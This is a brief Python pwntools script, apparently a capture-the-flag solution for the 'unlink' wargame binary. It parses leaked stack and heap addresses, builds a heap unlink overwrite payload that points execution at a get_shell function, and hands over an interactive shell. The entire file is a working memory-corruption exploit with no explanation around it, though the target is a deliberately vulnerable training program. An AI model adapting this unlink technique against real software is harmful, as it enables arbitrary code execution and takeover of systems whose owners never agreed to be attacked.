from pwn import *

get_shell = 0x80484eb

#shell = process('./unlink')
shell = process('/home/unlink/unlink')

shell.recvuntil('stack address leak: ')
stack_address = int(shell.recvline(), 16)
log.info('stack_address : {}'.format(hex(stack_address)))

shell.recvuntil('heap address leak: ')
heap_address = int(shell.recvline(), 16)
log.info('heap_address : {}'.format(hex(heap_address)))

shell.recvuntil('get shell!')

payload = ''
payload += p32(get_shell)
payload += 'A'*12
payload += p32(heap_address + 0xC)
payload += p32(stack_address + 0x10)

shell.sendline(payload)
shell.interactive()